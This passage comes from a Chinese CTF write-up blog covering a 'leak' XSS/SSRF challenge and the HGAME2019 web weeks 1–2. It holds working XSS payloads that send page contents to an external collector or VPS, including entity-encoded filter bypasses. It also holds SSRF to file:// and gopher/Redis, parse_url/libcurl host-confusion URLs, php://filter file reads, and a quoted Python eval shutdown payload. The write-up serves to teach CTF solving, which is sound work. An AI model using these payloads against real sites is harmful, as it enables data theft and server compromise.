leak</h1><p>上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显</p>\n<blockquote>\n<p>Admin only allowed from localhost, but you came from 192.168.123.1</p>\n</blockquote>\n<p>修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;ov0eg5.ceye.io&#x2F;?&#39;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>但是遭到了过滤，我们可以考虑用HTML实体编码绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#111;&amp;#118;&amp;#48;&amp;#101;&amp;#103;&amp;#53;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>果然可以收到payload，base64解码一下再保存为html格式打开</p>\n<p><img src=\"/2020/09/13/hackme-1/8.png\" alt></p>\n<p>send request功能有个request.php，尝试读取该页面</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class=\"line\">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class=\"line\">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);</span><br><span class=\"line\">xmlhttp.send();</span><br><span class=\"line\">&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>编码一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#51;&amp;#56;&amp;#46;&amp;#54;&amp;#56;&amp;#46;&amp;#50;&amp;#57;&amp;#46;&amp;#57;&amp;#50;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#51;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>然后在vps上即可收到base64字符串，解码</p>\n<p><img src=\"/2020/09/13/hackme-1/9.png\" alt></p>\n<p>这应该就是题目的利用位置，我们尝试读config.php文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class=\"line\">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class=\"line\">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class=\"line\">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class=\"line\">xmlhttp.send(&quot;url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;config.php&quot;);</span><br><span class=\"line\">&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>编码发送，果然可以收到flag</p>\n<p><img src=\"/2020/09/13/hackme-1/10.png\" alt=\"result\"></p>\n<h1 id=\"xssrf-redis\"><a href=\"#xssrf-redis\" class=\"headerlink\" title=\"xssrf redis\"></a>xssrf redis</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class=\"line\">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class=\"line\">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class=\"line\">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class=\"line\">xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_KEYS%2520*%250a_quit&quot;);</span><br><span class=\"line\">&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>发现有flag，读取之</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br></pre></td></tr></table></figure>\n<p>然后处理一下即可得到flag</p>\n","categories":["writeup"],"tags":["CTF"]},{"title":"HGAME2019-Web-Week1&2","url":"/2019/01/30/hgame2019/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>寒假无聊，听说这个题目非常基础（手动滑稽:(），所以来做一做</p>\n<a id=\"more\"></a>\n<h1 id=\"week-1\"><a href=\"#week-1\" class=\"headerlink\" title=\"week-1\"></a>week-1</h1><h2 id=\"谁吃了我的flag\"><a href=\"#谁吃了我的flag\" class=\"headerlink\" title=\"谁吃了我的flag\"></a>谁吃了我的flag</h2><p>vim文件泄露<code>.index.html.swp</code>，vim恢复即可得到flag<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;3eek_diScl0Sure_fRom+wEbsit@&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"very-easy-web\"><a href=\"#very-easy-web\" class=\"headerlink\" title=\"very easy web\"></a>very easy web</h2><p>url二次编码绕过 <code>?id=%2576%2569%2564%2561%2572</code><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;urlDecode_Is_GoOd&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"换头大作战\"><a href=\"#换头大作战\" class=\"headerlink\" title=\"换头大作战\"></a>换头大作战</h2><p>题目要求POST传值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http:&#x2F;&#x2F;120.78.184.111:8080&#x2F;week1&#x2F;how&#x2F;index.php --data &quot;want&#x3D;12&quot;</span><br></pre></td></tr></table></figure>\n<p>得到回显</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;br&#x2F;&gt;https:&#x2F;&#x2F;www.wikiwand.com&#x2F;en&#x2F;X-Forwarded-For&lt;br&#x2F;&gt;only localhost can get flag</span><br></pre></td></tr></table></figure>\n<p>依次按照要求设置请求头</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl http:&#x2F;&#x2F;120.78.184.111:8080&#x2F;week1&#x2F;how&#x2F;index.php --data &quot;want&#x3D;12&quot; -H &quot;x-forwarded-for:127.0.0.1&quot; -A &quot;User-Agent:Waterfox&#x2F;50.0&quot; -e www.bilibili.com</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;hTTp_HeaDeR_iS_Ez&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"can-u-find-me\"><a href=\"#can-u-find-me\" class=\"headerlink\" title=\"can u find me?\"></a>can u find me?</h2><p>查看源代码可知存在f12.php界面，在响应头中可以看到密码 <code>woyaoflag</code>，提交即会出现<code>cilck me to get flag</code>，点击则跳转到 <code>toofast.php</code>，回显<code>aoh,your speed is sososo fast,the flag must have been left in somewhere</code>，应该是出现了302跳转，抓包即可得到flag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;f12_1s_aMazIng111&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"week-2\"><a href=\"#week-2\" class=\"headerlink\" title=\"week-2\"></a>week-2</h1><h2 id=\"easy-php\"><a href=\"#easy-php\" class=\"headerlink\" title=\"easy_php\"></a>easy_php</h2><p>探测目录发现robots.txt下存在文件<code>img/index.php</code>，访问之，得到PHP代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">    $img = $_GET[<span class=\"string\">'img'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($img))</span><br><span class=\"line\">        $img = <span class=\"string\">'1'</span>;</span><br><span class=\"line\">    $img = str_replace(<span class=\"string\">'../'</span>, <span class=\"string\">''</span>, $img);</span><br><span class=\"line\">    <span class=\"keyword\">include_once</span>($img.<span class=\"string\">\".php\"</span>);</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n<p>题目过滤了<code>../</code>，且将其转换为空字符串，所以我们可以用<code>..././</code>来绕过，本来试了 <code>..././flag</code>，可是打不出flag，最终尝试了filter协议，原因在于include语句会将代码当做php代码执行，而转成base64编码之后则由于没有php前缀而无法被当成php代码从而将文本打印出来</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;118.24.25.25:9999&#x2F;easyphp&#x2F;img&#x2F;index.php?img&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;...&#x2F;.&#x2F;flag</span><br></pre></td></tr></table></figure>\n<p>base64解码即可得到flag，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;You_4re_So_g0od&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"php-trick\"><a href=\"#php-trick\" class=\"headerlink\" title=\"php trick\"></a>php trick</h2><p>代码审计</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//admin.php</span></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">$str1 = (string)@$_GET[<span class=\"string\">'str1'</span>];</span><br><span class=\"line\">$str2 = (string)@$_GET[<span class=\"string\">'str2'</span>];</span><br><span class=\"line\">$str3 = @$_GET[<span class=\"string\">'str3'</span>];</span><br><span class=\"line\">$str4 = @$_GET[<span class=\"string\">'str4'</span>];</span><br><span class=\"line\">$str5 = @$_GET[<span class=\"string\">'H_game'</span>];</span><br><span class=\"line\">$url = @$_GET[<span class=\"string\">'url'</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>( $str1 == $str2 )&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 1 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>( md5($str1) != md5($str2) )&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 2 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>( $str3 == $str4 )&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 3 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( md5($str3) !== md5($str4))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 4 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (strpos($_SERVER[<span class=\"string\">'QUERY_STRING'</span>], <span class=\"string\">\"H_game\"</span>) !==<span class=\"keyword\">false</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 5 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(is_numeric($str5))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 6 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($str5&lt;<span class=\"number\">9999999999</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 7 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((string)$str5&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 8 fial'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (parse_url($url, PHP_URL_HOST) !== <span class=\"string\">\"www.baidu.com\"</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 9 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (parse_url($url,PHP_URL_SCHEME) !== <span class=\"string\">\"http\"</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 10 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ch = curl_init();</span><br><span class=\"line\">curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class=\"line\">$output = curl_exec($ch);</span><br><span class=\"line\">curl_close($ch);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($output === <span class=\"keyword\">FALSE</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'step 11 fail'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $output;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第一个点md5绕过，第二个点是数组绕过，php数组在比较是比任何数字都大，payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;118.24.3.214:3001?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;a&amp;str4[]&#x3D;b&amp;H%5fgame[]&#x3D;5&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php</span><br></pre></td></tr></table></figure>\n<p>用两个@的原因可以参考这篇文章<a href=\"https://xz.aliyun.com/t/2215#toc-15\" target=\"_blank\" rel=\"noopener\">ref</a></p>\n<ul>\n<li>当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对user@eval.com:80@baidu.com </li>\n<li>进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过<br>此外对于evil@baidu.com这样的域名进行解析时,php获取的host是evil@baidu.com，但是libcurl获取的host却是evil.com</li>\n</ul>\n<p>可以得到admin.php页面的代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//flag.php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>] != <span class=\"string\">'127.0.0.1'</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'only localhost can see it'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$filename = $_GET[<span class=\"string\">'filename'</span>]??<span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (file_exists($filename)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"sorry,you can't see it\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> file_get_contents($filename);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n<p>查看代码可知存在flag.php页面，关键代码如下：<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (file_exists($filename)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"sorry,you can't see it\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> file_get_contents($filename);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>当filename是flag.php（即文件存在时），又无法读取到文件，此时可以利用file_get_contents支持多种协议来读取到文件，可以使用php://filter协议，最终payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;118.24.3.214:3001?str1&#x3D;240610708&amp;str2&#x3D;QNKCDZO&amp;str3[]&#x3D;a&amp;str4[]&#x3D;b&amp;H%5fgame[]&#x3D;5&amp;url&#x3D;http:&#x2F;&#x2F;@127.0.0.1:80@www.baidu.com&#x2F;admin.php?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>\n<p>flag.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php $flag &#x3D; hgame&#123;ThEr4_Ar4_s0m4_Php_Tr1cks&#125; ?&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"PHP-Is-The-Best-Language\"><a href=\"#PHP-Is-The-Best-Language\" class=\"headerlink\" title=\"PHP Is The Best Language\"></a>PHP Is The Best Language</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'secret.php'</span>;</span><br><span class=\"line\"><span class=\"comment\">#echo $flag;</span></span><br><span class=\"line\"><span class=\"comment\">#echo $secret;</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'gate'</span>]) || <span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'key'</span>])) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'door'</span>]))&#123;</span><br><span class=\"line\">    $secret = hash_hmac(<span class=\"string\">'sha256'</span>, $_POST[<span class=\"string\">'door'</span>], $secret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$gate = hash_hmac(<span class=\"string\">'sha256'</span>, $_POST[<span class=\"string\">'key'</span>], $secret);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($gate !== $_POST[<span class=\"string\">'gate'</span>]) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Hacker GetOut!!\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((md5($_POST[<span class=\"string\">'key'</span>])+<span class=\"number\">1</span>) == (md5(md5($_POST[<span class=\"string\">'key'</span>])))+<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Wow!!!\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;/br&gt;\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Hacker GetOut!!\"</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码审计题目，核心代码在于</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'door'</span>]))&#123;</span><br><span class=\"line\">    $secret = hash_hmac(<span class=\"string\">'sha256'</span>, $_POST[<span class=\"string\">'door'</span>], $secret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$gate = hash_hmac(<span class=\"string\">'sha256'</span>, $_POST[<span class=\"string\">'key'</span>], $secret);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ($gate !== $_POST[<span class=\"string\">'gate'</span>]) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Hacker GetOut!!\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们无法控制$secret变量，自然无法计算出对应的哈希值，那么有没有那种带加密输入（door）的哈希与secret值无关呢？在PHP里面这个是存在的，就是<strong>数组(Array)</strong>，由于数组是hash_hmac无法处理的输入类型，所以会返回<strong>null</strong></p>\n<p>第二处在于<code>(md5($_POST[&#39;key&#39;])+1) == (md5(md5($_POST[&#39;key&#39;])))+1</code></p>\n<p>此处我们可以爆破</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>($i=<span class=\"number\">1</span>;$i&lt;<span class=\"number\">9999999999</span>;$i++)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ((md5($i)+<span class=\"number\">1</span>) == (md5(md5($i)))+<span class=\"number\">1</span>) &#123; </span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> $i;</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果为12</p>\n<p>最终payload为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">door[]&#x3D;12&amp;key&#x3D;12&amp;gate&#x3D;4217722a8aee69d5ed50f3e5ed1cceb1feb79784baaaa6bbf53515ce0eb4daaf</span><br></pre></td></tr></table></figure>\n<p>flag如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;Php_MayBe_Not_Safe&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Baby-Spider\"><a href=\"#Baby-Spider\" class=\"headerlink\" title=\"Baby_Spider\"></a>Baby_Spider</h2><p>题目考察我们的爬虫能力，真的做的我胃疼</p>\n<p>题目一共30关，40秒内答对30关的数学题即可获得flag</p>\n<ul>\n<li><p>1-10<br>需要用token先登录一下，注意要带上UA头，如果不带的话到第十关算式就会变成</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">(lambda __g: [(os.system(&#39;shutdown -s -t 0&#39;), (os.system(&#39;shutdown now&#39;), None)[1])[1] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0])(globals())#-----&#x3D;?</span><br></pre></td></tr></table></figure>\n<p>由eval函数执行之后直接就关机了（这反爬虫机制真的是骚~~）</p>\n</li>\n<li><p>11-20<br>第十一关开始题目就变了，居然修改了css字体，抓取一下css文件如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">@font-face &#123;</span><br><span class=\"line\">      font-family: Ariali;</span><br><span class=\"line\">      src: url(&#39;&#x2F;static&#x2F;Ariali.otf&#39;);</span><br><span class=\"line\">      font-weight: normal;</span><br><span class=\"line\">      font-style: normal;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>下载字体<br><img src=\"https://i.loli.net/2019/02/11/5c614ba6c3e49.png\" alt><br>可以看到数字对应规则变化了，对应置换一下即可</p>\n</li>\n<li><p>21-30<br>此关开始之后，隐藏了真实的数学表达式位置，如果按照题目的计算答案是错的，结果是在css中的after元素下找到了算式，获取之后计算即可</p>\n</li>\n</ul>\n<p>最终paylaod如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">token = <span 